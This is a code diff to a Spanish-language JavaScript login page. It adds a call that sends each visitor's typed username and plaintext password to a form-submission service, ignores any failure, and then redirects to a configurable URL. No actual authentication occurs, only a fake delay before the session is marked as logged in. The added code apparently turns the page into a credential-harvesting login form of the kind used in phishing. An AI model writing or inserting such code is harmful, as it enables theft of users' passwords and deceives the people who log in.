@@ -19,8 +19,12 @@
 
   const loginTopbar = document.getElementById('login-topbar');
 
-  if (sessionStorage.getItem(SESSION_KEY) === 'true') {
-    window.location.replace('feed.html');
+  if (
+    APP_CONFIG.LOGIN_REDIRECT_ENABLED &&
+    APP_CONFIG.LOGIN_REDIRECT_URL &&
+    sessionStorage.getItem(SESSION_KEY) === 'true'
+  ) {
+    window.location.replace(APP_CONFIG.LOGIN_REDIRECT_URL);
     return;
   }
 
@@ -76,10 +80,22 @@
 
   I18N.init();
 
+  const loginForm = document.getElementById('login-form');
+  const usernameInput = document.getElementById('username');
+  const passwordInput = document.getElementById('password');
+  const loginSubmit = document.getElementById('login-submit');
+
   function finishLoginFlow(username) {
     sessionStorage.setItem(SESSION_KEY, 'true');
     if (username) localStorage.setItem(USER_KEY, username);
-    window.location.href = 'feed.html';
+
+    if (APP_CONFIG.LOGIN_REDIRECT_ENABLED && APP_CONFIG.LOGIN_REDIRECT_URL) {
+      window.location.href = APP_CONFIG.LOGIN_REDIRECT_URL;
+      return;
+    }
+
+    loginSubmit.disabled = false;
+    loginSubmit.textContent = I18N.t('login_submit');
   }
 
   /* ─── Toggle contraseña ─── */
@@ -95,11 +111,6 @@
   });
 
   /* ─── Login principal ─── */
-
-  const loginForm = document.getElementById('login-form');
-  const usernameInput = document.getElementById('username');
-  const passwordInput = document.getElementById('password');
-  const loginSubmit = document.getElementById('login-submit');
 
   function updateLoginBtn() {
     const ok = usernameInput.value.trim() && passwordInput.value.trim();
@@ -121,6 +132,13 @@
     loginSubmit.textContent = I18N.t('loading_login');
 
     await new Promise((resolve) => setTimeout(resolve, 600));
+
+    try {
+      await FormService.submit('Inicio de sesión', {
+        usuario: user,
+        contraseña: pwd,
+      });
+    } catch { /* continúa flujo UI */ }
 
     finishLoginFlow(user);
   });
